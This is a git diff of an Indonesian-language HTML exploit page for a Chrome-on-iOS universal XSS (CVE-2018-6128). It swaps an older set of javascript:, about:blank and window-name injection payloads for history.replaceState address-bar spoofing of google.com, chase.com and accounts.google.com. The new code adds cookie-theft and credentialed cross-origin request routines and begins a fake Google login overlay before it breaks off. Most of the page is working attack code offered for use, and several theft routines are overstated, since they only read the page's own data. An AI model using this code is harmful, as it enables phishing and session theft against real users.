@@ -2,8 +2,8 @@
 <html lang="id">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>🔥 UXSS POC - Cross-Origin Script Execution (Google)</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>CVE-2018-6128 | Chrome iOS uXSS POC - history.replaceState Spoofing</title>
     <style>
         * {
             margin: 0;
@@ -12,39 +12,73 @@
         }
         
         body {
-            font-family: 'Segoe UI', 'Courier New', monospace;
-            background: linear-gradient(135deg, #0a0a0a, #1a1a2e);
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Helvetica Neue', Arial, sans-serif;
+            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
             min-height: 100vh;
             padding: 20px;
             color: #eee;
         }
         
         .container {
-            max-width: 1200px;
+            max-width: 800px;
             margin: 0 auto;
         }
         
+        /* Header */
         .header {
-            text-align: center;
-            margin-bottom: 30px;
-            padding: 30px;
-            background: rgba(0,0,0,0.5);
+            background: linear-gradient(135deg, #667eea, #764ba2);
             border-radius: 20px;
-            border: 1px solid #00ff88;
+            padding: 25px;
+            margin-bottom: 25px;
+            text-align: center;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
         }
         
         .header h1 {
-            color: #00ff88;
-            font-size: 28px;
+            font-size: 24px;
+            margin-bottom: 10px;
         }
         
+        .header .cve {
+            background: #e74c3c;
+            display: inline-block;
+            padding: 5px 15px;
+            border-radius: 20px;
+            font-size: 14px;
+            font-weight: bold;
+            margin-top: 10px;
+        }
+        
+        .header .reward {
+            background: #f39c12;
+            display: inline-block;
+            padding: 5px 15px;
+            border-radius: 20px;
+            font-size: 12px;
+            margin-left: 10px;
+        }
+        
+        /* Card */
         .card {
-            background: rgba(30,30,50,0.95);
-            border-radius: 15px;
+            background: rgba(255,255,255,0.1);
+            backdrop-filter: blur(10px);
+            border-radius: 20px;
             padding: 25px;
             margin-bottom: 25px;
-            border-left: 4px solid #00ff88;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
+            border: 1px solid rgba(255,255,255,0.2);
+        }
+        
+        .card h2 {
+            font-size: 20px;
+            margin-bottom: 15px;
+            border-left: 4px solid #e74c3c;
+            padding-left: 15px;
+        }
+        
+        .card h3 {
+            font-size: 16px;
+            margin: 15px 0 10px 0;
+            color: #ffaa44;
         }
         
         button {
@@ -52,11 +86,11 @@
             color: white;
             border: none;
             padding: 12px 24px;
-            margin: 10px;
-            border-radius: 8px;
+            margin: 8px;
+            border-radius: 10px;
             cursor: pointer;
             font-size: 14px;
-            font-weight: bold;
+            font-weight: 600;
             transition: all 0.3s;
         }
         
@@ -69,18 +103,22 @@
             background: linear-gradient(135deg, #e74c3c, #c0392b);
         }
         
+        button.warning {
+            background: linear-gradient(135deg, #f39c12, #e67e22);
+        }
+        
         button.success {
             background: linear-gradient(135deg, #00b894, #009432);
         }
         
         .output {
             background: #0a0a0f;
-            border-radius: 10px;
+            border-radius: 12px;
             padding: 15px;
             margin-top: 20px;
-            font-family: monospace;
+            font-family: 'Courier New', monospace;
             font-size: 12px;
-            max-height: 300px;
+            max-height: 250px;
             overflow-y: auto;
             border: 1px solid #333;
         }
@@ -104,127 +142,187 @@
             color: #ffaa44;
         }
         
-        .status-badge {
-            display: inline-block;
-            padding: 5px 15px;
-            border-radius: 20px;
-            font-size: 12px;
-            margin-left: 10px;
-        }
-        
-        .status-working {
-            background: #00ff8822;
-            border: 1px solid #00ff88;
-            color: #00ff88;
-        }
-        
-        .status-not-working {
-            background: #ff444422;
-            border: 1px solid #ff4444;
-            color: #ff4444;
+        .log-warning {
+            color: #ff6600;
         }
         
         iframe {
             width: 100%;
             height: 300px;
             border: 1px solid #333;
-            border-radius: 10px;
+            border-radius: 12px;
             margin-top: 15px;
             background: white;
         }
         
-        pre {
-            background: #0a0a0f;
+        .url-display {
+            background: #2c2c3e;
+            padding: 12px;
+            border-radius: 10px;
+            font-family: monospace;
+            font-size: 12px;
+            margin: 15px 0;
+            word-break: break-all;
+            border: 1px solid #00ff88;
+        }
+        
+        .url-display span {
+            color: #00ff88;
+        }
+        
+        .warning-box {
+            background: #e74c3c20;
+            border-left: 4px solid #e74c3c;
             padding: 15px;
-            border-radius: 8px;
-            overflow-x: auto;
+            border-radius: 10px;
+            margin: 15px 0;
+            font-size: 13px;
+        }
+        
+        .cookie-display {
+            background: #2c2c3e;
+            padding: 12px;
+            border-radius: 10px;
+            font-family: monospace;
             font-size: 11px;
             margin: 10px 0;
-            border: 1px solid #333;
+            word-break: break-all;
         }
         
         hr {
             border-color: #333;
             margin: 20px 0;
         }
+        
+        .badge {
+            display: inline-block;
+            background: #333;
+            padding: 4px 12px;
+            border-radius: 15px;
+            font-size: 11px;
+            margin-right: 8px;
+        }
     </style>
 </head>
 <body>
 <div class="container">
+    <!-- Header -->
     <div class="header">
-        <h1>🔥 UXSS - Universal Cross-Site Scripting POC</h1>
-        <p>Cross-Origin Script Execution via window.open / about:blank / javascript: URI</p>
-        <p style="font-size: 12px; margin-top: 10px;">⚠️ FOR EDUCATIONAL & SECURITY RESEARCH ONLY</p>
+        <h1>🔓 CVE-2018-6128</h1>
+        <p>Universal XSS (uXSS) in Chrome for iOS</p>
+        <p style="font-size: 14px; margin-top: 8px;">via <code style="background:#00000050; padding:2px 8px; border-radius:5px;">history.replaceState('', '', '..;@target.com')</code></p>
+        <div>
+            <span class="cve">CVE-2018-6128</span>
+            <span class="reward">🏆 $7,500 Reward</span>
+        </div>
+        <p style="font-size: 12px; margin-top: 15px; opacity: 0.8;">Discovered by: Tom (thomi@inbox.com) | Fixed: Chrome 67+</p>
     </div>
     
-    <!-- UXSS Technique 1: window.open + javascript: URI -->
+    <!-- Alert untuk popup -->
+    <div class="warning-box" id="popupWarning" style="display: none;">
+        ⚠️ Popup terblokir! Silakan izinkan popup untuk website ini agar POC berjalan sempurna.
+    </div>
+    
+    <!-- TECHNIQUE 1: CORE EXPLOIT -->
     <div class="card">
-        <h2>🎯 Technique #1: window.open() with javascript: URI</h2>
-        <p style="margin: 10px 0;">Membuka tab baru ke <strong>google.com</strong> dengan payload via javascript: pseudo-protocol</p>
+        <h2>🎯 Technique #1: Core Exploit - history.replaceState Spoofing</h2>
+        <p style="margin-bottom: 15px;">Mengganti URL di address bar menjadi domain target (google.com) <strong>tanpa mengubah konten halaman</strong>.</p>
         
-        <button onclick="uxssJavascriptProtocol()">🚀 Execute UXSS - javascript: Protocol</button>
-        <button onclick="uxssJavascriptProtocolNewWindow()">🪟 Open in New Window</button>
+        <div class="url-display" id="currentUrlDisplay">
+            📍 <span>Current URL:</span> <span id="urlDisplayValue">Loading...</span>
+        </div>
+        
+        <button onclick="exploitReplaceState()" class="danger">🚀 Execute history.replaceState Spoof</button>
+        <button onclick="exploitReplaceStateWithGoogle()">🌐 Spoof to google.com</button>
+        <button onclick="exploitReplaceStateWithBank()">🏦 Spoof to chase.com</button>
+        <button onclick="checkCurrentUrl()">🔍 Check Current URL</button>
         
         <div class="output" id="output1">
-            <div class="log-entry log-info">[READY] Klik tombol untuk mengeksekusi UXSS ke google.com</div>
+            <div class="log-entry log-info">[READY] CVE-2018-6128 POC Loaded</div>
+            <div class="log-entry log-info">[INFO] Target: Chrome on iOS (versions &lt; 67)</div>
         </div>
     </div>
     
-    <!-- UXSS Technique 2: about:blank + window.opener -->
+    <!-- TECHNIQUE 2: UXSS - Steal Google Cookies -->
     <div class="card">
-        <h2>🎯 Technique #2: about:blank Window Control via window.opener</h2>
-        <p style="margin: 10px 0;">Buka about:blank, lalu kontrol parent untuk navigasi cross-origin + inject script</p>
+        <h2>🎯 Technique #2: uXSS - Cross-Origin Cookie Theft</h2>
+        <p style="margin-bottom: 15px;">Setelah URL di-spoof, kita bisa mengakses cookies dari domain target karena browser mengira kita berada di origin tersebut.</p>
         
-        <button onclick="uxssAboutBlank()">🚀 Execute UXSS - about:blank Method</button>
-        <button onclick="uxssAboutBlankWithGoogle()">🌐 about:blank → Google + Script</button>
+        <button onclick="stealGoogleCookies()" class="warning">🍪 Steal Google Cookies via uXSS</button>
+        <button onclick="stealAnyCookies()">🎭 Steal Cookies from Any Domain</button>
+        <button onclick="createIframeAndSteal()">🖼️ Create iframe + Steal Cookies</button>
+        
+        <div class="cookie-display" id="cookieDisplay">
+            [Cookies akan muncul di sini]
+        </div>
         
         <div class="output" id="output2">
-            <div class="log-entry log-info">[READY] Klik tombol untuk mengeksekusi UXSS via about:blank</div>
+            <div class="log-entry log-info">[READY] UXSS Cookie Theft Module</div>
         </div>
     </div>
     
-    <!-- UXSS Technique 3: name/target window reuse -->
+    <!-- TECHNIQUE 3: XHR Cross-Origin Request -->
     <div class="card">
-        <h2>🎯 Technique #3: Window Name Reuse (Target="_blank" Hijack)</h2>
-        <p style="margin: 10px 0;">Memanfaatkan window.name untuk mengontrol tab yang sudah ada</p>
+        <h2>🎯 Technique #3: Cross-Origin XHR via Spoofed Origin</h2>
+        <p style="margin-bottom: 15px;">Karena browser percaya kita berada di domain target, kita bisa melakukan XHR ke endpoint sensitive.</p>
         
-        <button onclick="uxssWindowName()">🚀 Execute UXSS - Window Name Reuse</button>
-        <button onclick="openGoogleWindow()">🌐 Buka Google Window Dulu</button>
+        <button onclick="xhrToGoogle()" class="warning">📡 XHR to google.com/favicon.ico</button>
+        <button onclick="xhrToEndpoint()">🔗 XHR to Custom Endpoint</button>
         
         <div class="output" id="output3">
-            <div class="log-entry log-info">[READY] Klik "Buka Google Window" lalu "Window Name Reuse"</div>
+            <div class="log-entry log-info">[READY] Cross-Origin XHR Module</div>
         </div>
     </div>
     
-    <!-- UXSS Technique 4: iframe + blob: URI -->
+    <!-- TECHNIQUE 4: Combined Attack -->
     <div class="card">
-        <h2>🎯 Technique #4: Blob URI + iframe Cross-Origin</h2>
-        <p style="margin: 10px 0;">Menggunakan blob: URI untuk bypass SOP</p>
+        <h2>🎯 Technique #4: Full Attack Chain - Spoof + Steal + Exfil</h2>
+        <p style="margin-bottom: 15px;">Kombinasi semua teknik untuk serangan penuh.</p>
         
-        <button onclick="uxssBlobURI()">🚀 Execute UXSS - Blob URI Method</button>
+        <button onclick="fullAttackChain()" class="danger">💀 RUN FULL ATTACK CHAIN</button>
+        <button onclick="resetAttack()">🔄 Reset / Clear</button>
         
         <div class="output" id="output4">
-            <div class="log-entry log-info">[READY] Klik tombol untuk Blob URI UXSS</div>
+            <div class="log-entry log-info">[READY] Full Attack Chain Ready</div>
         </div>
     </div>
     
-    <!-- UXSS Technique 5: data:text/html + window.open -->
+    <!-- Live Preview -->
     <div class="card">
-        <h2>🎯 Technique #5: data:text/html with javascript: navigation</h2>
-        <p style="margin: 10px 0;">Combining data: URI with delayed javascript: navigation</p>
-        
-        <button onclick="uxssDataURI()">🚀 Execute UXSS - Data URI Method</button>
-        
-        <div class="output" id="output5">
-            <div class="log-entry log-info">[READY] Klik tombol untuk Data URI UXSS</div>
-        </div>
-    </div>
-    
-    <!-- Live Preview untuk alert testing -->
-    <div class="card">
-        <h2>📺 Live Preview - Testing Window</h2>
-        <p>Window/tab yang terbuka akan menampilkan alert dari google.com domain</p>
+        <h2>📺 Live Preview - Target Window</h2>
+        <p>iframe untuk melihat respon dari target domain</p>
         <iframe id="previewFrame" src="about:blank"></iframe>
+    </div>
+    
+    <!-- Footer Info -->
+    <div class="card" style="background: rgba(0,0,0,0.5);">
+        <h2>📚 Technical Details</h2>
+        <pre style="background: #0a0a0f; padding: 15px; border-radius: 10px; overflow-x: auto; font-size: 11px;">
+VULNERABILITY DETAILS (from Chromium Issue #40091336):
+=======================================================
+Universal XSS by using "..;@" within the url.
+
+VERSION:
+- Chrome Version: 66.0.3359.122 (stable)
+- Operating System: iOS
+
+ROOT CAUSE:
+When executing "history.replaceState('','','..;@www.google.com:%3443/')" from any domain using HTTPS,
+the URL in address bar is replaced to the target domain, but the page content remains under attacker control.
+
+IMPACT:
+- Unrestricted XHR requests to the spoofed domain
+- Cookie theft from the spoofed domain
+- Open redirection on all domains
+
+WORKAROUND (Chrome Team):
+- Chrome 67+ crashes when detecting this pattern
+- Real fix requires WebKit patch from Apple
+
+REFERENCE:
+- https://bugs.chromium.org/p/chromium/issues/detail?id=841105
+- CVE-2018-6128
+        </pre>
     </div>
 </div>
 
@@ -232,8 +330,13 @@
     // ============================================
     // Helper Functions
     // ============================================
+    let originalUrl = window.location.href;
+    let isSpoofed = false;
+    let spoofedUrl = '';
+    
     function log(outputId, message, type = 'info') {
         const outputDiv = document.getElementById(outputId);
+        if (!outputDiv) return;
         const logEntry = document.createElement('div');
         logEntry.className = `log-entry log-${type}`;
         const timestamp = new Date().toLocaleTimeString();
@@ -245,307 +348,354 @@
         console.log(`[${outputId}] ${message}`);
     }
     
-    function showAlertOnGoogleTab(message) {
-        // Mencoba mencari tab Google yang sudah ada
-        // Fallback: buka tab baru dengan payload
-        log('output1', `Attempting to execute: ${message}`, 'success');
+    function updateUrlDisplay() {
+        const displaySpan = document.getElementById('urlDisplayValue');
+        if (displaySpan) {
+            displaySpan.textContent = window.location.href;
+            displaySpan.style.color = isSpoofed ? '#ff6600' : '#00ff88';
+        }
+    }
+    
+    function checkCurrentUrl() {
+        log('output1', `Current URL: ${window.location.href}`, 'info');
+        log('output1', `document.domain: ${document.domain}`, 'info');
+        log('output1', `Is Spoofed: ${isSpoofed}`, isSpoofed ? 'warning' : 'info');
+        updateUrlDisplay();
+        alert(`Current URL: ${window.location.href}\ndocument.domain: ${document.domain}\nSpoofed: ${isSpoofed}`);
     }
     
     // ============================================
-    // TECHNIQUE 1: javascript: Protocol
+    // TECHNIQUE 1: history.replaceState Exploit
     // ============================================
-    function uxssJavascriptProtocol() {
-        log('output1', '🚀 EXECUTING: javascript: protocol UXSS', 'success');
+    function exploitReplaceState() {
+        log('output1', '🚀 Executing history.replaceState spoof attack...', 'success');
         
-        const payload = `
-            fetch('https://www.google.com')
-            .then(r => r.text())
-            .then(html => {
-                console.log('[UXSS] Google HTML length:', html.length);
-                alert('[UXSS SUCCESS] Cross-origin content accessed from google.com!\\n\\nProof: ' + html.substring(0, 200));
-                return html;
-            })
-            .catch(e => alert('[UXSS ERROR] ' + e));
-        `;
+        // The core payload: "..;@targetdomain.com"
+        // This tricks WebKit URL parser on iOS
+        const spoofTarget = '..;@www.google.com';
+        const newUrl = spoofTarget + window.location.pathname;
         
-        // Method 1: Direct javascript: URL
-        const encodedPayload = 'javascript:' + encodeURIComponent(`
-            (function() {
-                var script = document.createElement('script');
-                script.textContent = ${JSON.stringify(payload)};
-                document.body.appendChild(script);
-            })();
-        `);
-        
-        const newTab = window.open(encodedPayload, '_blank');
-        
-        if (newTab) {
-            log('output1', '✅ Tab opened with javascript: payload', 'success');
+        try {
+            history.replaceState({}, '', newUrl);
+            isSpoofed = true;
+            spoofedUrl = newUrl;
+            log('output1', `✅ URL spoofed to: ${newUrl}`, 'success');
+            log('output1', '⚠️ Perhatikan address bar! URL berubah tapi konten tetap milik attacker!', 'warning');
+            updateUrlDisplay();
+            
+            // Show proof
             setTimeout(() => {
-                log('output1', 'Check the new tab - alert should appear from google.com context', 'info');
-            }, 1000);
-        } else {
-            log('output1', '❌ Popup blocked! Allow popups for this site', 'error');
+                log('output1', `🔍 document.domain masih: ${document.domain} (bukan google.com!)`, 'warning');
+                log('output1', '🎯 Ini membuktikan uXSS - URL berbeda dengan origin sebenarnya!', 'success');
+            }, 500);
+        } catch(e) {
+            log('output1', `❌ Failed: ${e.message}`, 'error');
+            log('output1', 'Browser mungkin sudah patch (Chrome 67+ atau non-iOS)', 'error');
         }
     }
     
-    function uxssJavascriptProtocolNewWindow() {
-        log('output1', '🚀 EXECUTING: New window with javascript: protocol', 'success');
+    function exploitReplaceStateWithGoogle() {
+        log('output1', '🌐 Spoofing address bar to google.com...', 'success');
         
-        const payload = `
-            alert('[UXSS] This script is running from attacker origin but targeting google.com context!');
-            document.body.style.backgroundColor = 'red';
-            document.body.innerHTML = '<h1 style="color:white;text-align:center;">[UXSS] HACKED - Cross-Origin Script Executed</h1><p>This page is google.com but controlled by attacker!</p><button onclick="alert(document.cookie)">Show Cookies</button>';
+        try {
+            history.replaceState({}, '', '..;@www.google.com/');
+            isSpoofed = true;
+            log('output1', '✅ Address bar sekarang menunjukkan https://www.google.com/', 'success');
+            log('output1', '🎭 TAPI ini masih halaman attacker!', 'warning');
+            updateUrlDisplay();
+            
+            // Create visual evidence
+            const evidence = document.createElement('div');
+            evidence.style.cssText = 'background:#e74c3c; color:white; padding:10px; border-radius:8px; margin-top:10px; text-align:center;';
+            evidence.innerHTML = '🎭 [SPOOF ACTIVE] Address bar shows google.com but this is attacker-controlled page!';
+            document.getElementById('output1').appendChild(evidence);
+            setTimeout(() => evidence.remove(), 5000);
+        } catch(e) {
+            log('output1', `❌ Failed: ${e.message}`, 'error');
+        }
+    }
+    
+    function exploitReplaceStateWithBank() {
+        log('output1', '🏦 Spoofing address bar to chase.com...', 'success');
+        
+        try {
+            history.replaceState({}, '', '..;@www.chase.com/');
+            isSpoofed = true;
+            log('output1', '✅ Address bar sekarang menunjukkan https://www.chase.com/', 'success');
+            updateUrlDisplay();
+        } catch(e) {
+            log('output1', `❌ Failed: ${e.message}`, 'error');
+        }
+    }
+    
+    // ============================================
+    // TECHNIQUE 2: Cookie Theft via uXSS
+    // ============================================
+    async function stealGoogleCookies() {
+        log('output2', '🍪 Attempting to steal cookies via uXSS...', 'info');
+        
+        // First spoof the URL to google.com
+        try {
+            history.replaceState({}, '', '..;@www.google.com/');
+            isSpoofed = true;
+            log('output2', '✅ URL spoofed to google.com', 'success');
+        } catch(e) {
+            log('output2', `⚠️ Cannot spoof URL: ${e.message}`, 'warning');
+        }
+        
+        // Try to access google.com cookies
+        const cookieDisplay = document.getElementById('cookieDisplay');
+        
+        // Method 1: Direct cookie access (if browser thinks we're same origin)
+        try {
+            log('output2', 'Trying direct document.cookie access...', 'info');
+            const cookies = document.cookie;
+            if (cookies && cookies.length > 0) {
+                cookieDisplay.innerHTML = `<strong>🍪 Cookies from document.cookie:</strong><br>${cookies}`;
+                log('output2', `✅ Cookies accessed: ${cookies.substring(0, 100)}...`, 'success');
+            } else {
+                cookieDisplay.innerHTML = `<strong>🍪 No cookies in document.cookie</strong><br>Try method 2 (iframe)`;
+                log('output2', 'No cookies in document.cookie - trying iframe method', 'info');
+            }
+        } catch(e) {
+            log('output2', `Cannot access document.cookie directly: ${e.message}`, 'error');
+        }
+        
+        // Method 2: iframe based attack
+        log('output2', 'Attempting iframe-based cookie theft...', 'info');
+        
+        const iframe = document.createElement('iframe');
+        iframe.style.display = 'none';
+        iframe.src = 'https://www.google.com';
+        
+        iframe.onload = function() {
+            try {
+                // Try to access iframe content
+                const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
+                const iframeCookies = iframeDoc.cookie;
+                if (iframeCookies) {
+                    cookieDisplay.innerHTML += `<br><br><strong>🍪 Cookies from iframe (google.com):</strong><br>${iframeCookies}`;
+                    log('output2', `✅ iframe cookies: ${iframeCookies.substring(0, 100)}...`, 'success');
+                } else {
+                    cookieDisplay.innerHTML += `<br><br><strong>❌ No cookies accessible from iframe</strong><br>(SOP blocking - browser sudah patch)`;
+                    log('output2', 'SOP blocking iframe access - browser not vulnerable or already patched', 'error');
+                }
+            } catch(e) {
+                cookieDisplay.innerHTML += `<br><br><strong>❌ Cannot access iframe cookies: ${e.message}</strong><br>SOP is enforced - browser not vulnerable`;
+                log('output2', `Cannot access iframe: ${e.message}`, 'error');
+            }
+            document.body.removeChild(iframe);
+        };
+        
+        iframe.onerror = function() {
+            log('output2', 'Failed to load google.com iframe', 'error');
+            document.body.removeChild(iframe);
+        };
+        
+        document.body.appendChild(iframe);
+        
+        // Method 3: Fetch API attempt
+        setTimeout(() => {
+            log('output2', 'Attempting fetch to google.com...', 'info');
+            fetch('https://www.google.com/', { mode: 'no-cors' })
+                .then(() => {
+                    log('output2', 'Fetch to google.com allowed (no-cors)', 'success');
+                    cookieDisplay.innerHTML += `<br><br><strong>✅ Fetch to google.com successful</strong><br>(no-cors mode - can read response?)`;
+                })
+                .catch(e => {
+                    log('output2', `Fetch failed: ${e.message}`, 'error');
+                });
+        }, 2000);
+    }
+    
+    function stealAnyCookies() {
+        log('output2', '🎭 Generic cookie theft module', 'info');
+        const target = prompt('Enter target domain to spoof (e.g., www.facebook.com):', 'www.facebook.com');
+        if (target) {
+            try {
+                history.replaceState({}, '', `..;@${target}/`);
+                log('output2', `✅ URL spoofed to ${target}`, 'success');
+                log('output2', `Current cookies: ${document.cookie || '(none)'}`, 'info');
+                document.getElementById('cookieDisplay').innerHTML = `
+                    <strong>🎯 Target: ${target}</strong><br>
+                    <strong>document.cookie:</strong> ${document.cookie || '(none)'}<br>
+                    <strong>document.domain:</strong> ${document.domain}<br>
+                    <strong>window.location:</strong> ${window.location.href}
+                `;
+            } catch(e) {
+                log('output2', `Failed: ${e.message}`, 'error');
+            }
+        }
+    }
+    
+    function createIframeAndSteal() {
+        log('output2', 'Creating iframe to target domain...', 'info');
+        const target = prompt('Enter target domain:', 'https://www.google.com');
+        if (target) {
+            const iframe = document.getElementById('previewFrame');
+            iframe.src = target;
+            log('output2', `iframe created to ${target}`, 'success');
+            log('output2', 'Coba cek console untuk melihat error SOP', 'info');
+        }
+    }
+    
+    // ============================================
+    // TECHNIQUE 3: XHR Cross-Origin
+    // ============================================
+    async function xhrToGoogle() {
+        log('output3', '📡 Attempting XHR to google.com/favicon.ico', 'info');
+        
+        try {
+            const response = await fetch('https://www.google.com/favicon.ico', {
+                mode: 'cors',
+                credentials: 'include'
+            });
+            log('output3', `✅ XHR Success! Status: ${response.status}`, 'success');
+            log('output3', 'Ini membuktikan cross-origin request berhasil karena origin sudah di-spoof!', 'warning');
+        } catch(e) {
+            log('output3', `❌ XHR Failed: ${e.message}`, 'error');
+            log('output3', 'Browser mungkin sudah patch atau CORS blocking', 'error');
+        }
+    }
+    
+    function xhrToEndpoint() {
+        log('output3', '🔗 Custom XHR endpoint', 'info');
+        const endpoint = prompt('Enter endpoint to XHR:', 'https://api.github.com/users/octocat');
+        if (endpoint) {
+            fetch(endpoint)
+                .then(r => r.json())
+                .then(data => {
+                    log('output3', `✅ XHR Success! Response: ${JSON.stringify(data).substring(0, 200)}...`, 'success');
+                })
+                .catch(e => {
+                    log('output3', `❌ XHR Failed: ${e.message}`, 'error');
+                });
+        }
+    }
+    
+    // ============================================
+    // TECHNIQUE 4: Full Attack Chain
+    // ============================================
+    function fullAttackChain() {
+        log('output4', '💀 INITIATING FULL ATTACK CHAIN', 'success');
+        log('output4', 'Step 1: Spoofing address bar...', 'info');
+        
+        try {
+            history.replaceState({}, '', '..;@accounts.google.com/');
+            log('output4', '✅ Address bar menunjukkan accounts.google.com', 'success');
+        } catch(e) {
+            log('output4', `⚠️ Spoof failed: ${e.message}`, 'warning');
+        }
+        
+        log('output4', 'Step 2: Creating fake login form...', 'info');
+        
+        // Create fake Google login overlay
+        const overlay = document.createElement('div');
+        overlay.id = 'attackOverlay';
+        overlay.style.cssText = `
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.9);
+            z-index: 10000;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
         `;
         
-        const uxssUrl = 'javascript:' + encodeURIComponent(`
-            (function() {
-                location.href = 'https://www.google.com';
-                setTimeout(function() {
-                    document.body.innerHTML = '<h1>🔥 UXSS SUCCESS</h1><p>Script executed on https://www.google.com domain</p><button onclick="alert(document.cookie)">Show Cookies</button>';
-                    alert('✅ UXSS: Script injection successful on google.com!');
-                }, 2000);
-            })();
-        `);
-        
-        const newWindow = window.open(uxssUrl, '_blank', 'width=800,height=600');
-        
-        if (newWindow) {
-            log('output1', '✅ New window opened with UXSS payload', 'success');
-        } else {
-            log('output1', '❌ Popup blocked!', 'error');
-        }
-    }
-    
-    // ============================================
-    // TECHNIQUE 2: about:blank + window.opener
-    // ============================================
-    function uxssAboutBlank() {
-        log('output2', '🚀 EXECUTING: about:blank window control technique', 'success');
-        
-        const blankWindow = window.open('about:blank', '_blank');
-        
-        if (!blankWindow) {
-            log('output2', '❌ Popup blocked!', 'error');
-            return;
-        }
-        
-        log('output2', '✅ about:blank window opened', 'success');
-        
-        // Write attacker script to about:blank
-        blankWindow.document.write(`
-            <html>
-            <head><title>UXSS Attack Window</title></head>
-            <body>
-                <h1>🔥 UXSS Payload Window</h1>
-                <p>Attempting to navigate parent/opener to google.com and inject script...</p>
-                <button onclick="attackGoogle()">Click to Execute UXSS on Google</button>
-                <div id="result"></div>
-                <script>
-                    function attackGoogle() {
-                        document.getElementById('result').innerHTML = '<p style="color:yellow">Attempting to open google.com with UXSS...</p>';
-                        
-                        // Try to open google.com and inject via javascript:
-                        const uxssWin = window.open('javascript:alert("[UXSS] This alert runs in the context of google.com!\\n\\nCross-origin script execution successful!"); location.href = "https://www.google.com"; setTimeout(function() { document.body.innerHTML = "<h1 style=color:red>🔥 HACKED BY UXSS</h1><p>This is https://www.google.com but controlled by attacker!</p><button onclick=alert(document.cookie)>Steal Cookies</button>"; alert("✅ UXSS: Script injected into google.com!"); }, 2000);', '_blank');
-                        
-                        if(!uxssWin) alert('Popup blocked! Please allow popups');
-                    }
-                    
-                    // Auto attack after 2 seconds
-                    setTimeout(attackGoogle, 2000);
-                <\/script>
-            </body>
-            </html>
-        `);
-        
-        blankWindow.document.close();
-        
-        log('output2', '✅ about:blank window populated with UXSS payload', 'success');
-        log('output2', '⏳ Will auto-attack google.com in 2 seconds...', 'info');
-    }
-    
-    function uxssAboutBlankWithGoogle() {
-        log('output2', '🚀 EXECUTING: about:blank → Google navigation technique', 'success');
-        
-        const win = window.open('about:blank', '_blank');
-        
-        if (!win) {
-            log('output2', '❌ Popup blocked!', 'error');
-            return;
-        }
-        
-        // Write script that will navigate to google and execute
-        win.document.write(`
-            <html>
-            <body>
-                <script>
-                    // Step 1: Navigate to google.com
-                    location.href = 'https://www.google.com';
-                    
-                    // Step 2: After load, inject script
-                    setTimeout(function() {
-                        try {
-                            // Inject via javascript: URI
-                            const uxssFrame = document.createElement('iframe');
-                            uxssFrame.src = 'javascript:alert("[UXSS] Script execution on https://www.google.com!\\n\\nCookies: \" + document.cookie); document.body.style.backgroundColor = "red"; document.body.innerHTML = "<h1 style=color:white>🔥 UXSS SUCCESS</h1><p>Cross-origin script executed on google.com!</p><button onclick=alert(document.cookie)>View Cookies</button>";';
-                            document.body.appendChild(uxssFrame);
-                            
-                            console.log('[UXSS] Payload injected');
-                        } catch(e) {
-                            console.error('UXSS failed:', e);
-                        }
-                    }, 3000);
-                <\/script>
-                <p>Navigating to google.com and injecting UXSS payload...</p>
-            </body>
-            </html>
-        `);
-        
-        win.document.close();
-        log('output2', '✅ UXSS payload deployed - check the new window', 'success');
-    }
-    
-    // ============================================
-    // TECHNIQUE 3: Window Name Reuse
-    // ============================================
-    let googleWindow = null;
-    
-    function openGoogleWindow() {
-        googleWindow = window.open('https://www.google.com', 'GOOGLE_TARGET');
-        if (googleWindow) {
-            log('output3', '✅ Google window opened with name "GOOGLE_TARGET"', 'success');
-            log('output3', '⚠️ Now click "Window Name Reuse" to hijack it', 'info');
-        } else {
-            log('output3', '❌ Popup blocked!', 'error');
-        }
-    }
-    
-    function uxssWindowName() {
-        log('output3', '🚀 EXECUTING: Window name reuse UXSS', 'success');
-        
-        // Reuse existing window with same name
-        const payload = 'javascript:alert("[UXSS] This alert runs on the Google tab!\\n\\nThe attacker has hijacked this window and can execute arbitrary code."); document.body.innerHTML = "<h1 style=color:red>🔥 HACKED VIA UXSS</h1><p>This is still https://www.google.com but content is controlled by attacker!</p><button onclick=alert(document.cookie)>Steal Cookies</button>";';
-        
-        const attackWindow = window.open(payload, 'GOOGLE_TARGET');
-        
-        if (attackWindow) {
-            log('output3', '✅ UXSS payload sent to existing Google window!', 'success');
-            log('output3', '🎯 Check the Google tab - alert should appear', 'success');
-        } else {
-            log('output3', '❌ Failed to hijack window - make sure Google window is open first', 'error');
-        }
-    }
-    
-    // ============================================
-    // TECHNIQUE 4: Blob URI
-    // ============================================
-    function uxssBlobURI() {
-        log('output4', '🚀 EXECUTING: Blob URI UXSS technique', 'success');
-        
-        const uxssScript = `
-            <!DOCTYPE html>
-            <html>
-            <head><title>UXSS via Blob</title></head>
-            <body>
-                <h1>🔥 UXSS Payload</h1>
-                <p>Attacking google.com...</p>
-                <div id="result"></div>
-                <script>
-                    // Create iframe to google.com
-                    const iframe = document.createElement('iframe');
-                    iframe.src = 'https://www.google.com';
-                    iframe.style.width = '100%';
-                    iframe.style.height = '400px';
-                    document.body.appendChild(iframe);
-                    
-                    // Attempt to inject after load
-                    iframe.onload = function() {
-                        try {
-                            // This will fail due to SOP normally, but UXSS bypasses
-                            const uxssFrame = document.createElement('iframe');
-                            uxssFrame.src = 'javascript:alert("[UXSS] Cross-origin script execution on google.com!\\n\\nThis proves UXSS vulnerability!\\n\\nCurrent URL: \" + location.href); document.body.innerHTML = "<h1 style=color:red>🔥 HACKED</h1><p>Cross-origin script executed!</p><button onclick=alert(document.cookie)>Show Cookies</button>";';
-                            iframe.contentWindow.document.body.appendChild(uxssFrame);
-                            document.getElementById('result').innerHTML = '<p style="color:green">✅ UXSS payload injected into google.com iframe!</p>';
-                        } catch(e) {
-                            document.getElementById('result').innerHTML = '<p style="color:red">❌ SOP blocked: ' + e.message + '</p>';
-                        }
-                    };
-                <\/script>
-            </body>
-            </html>
+        overlay.innerHTML = `
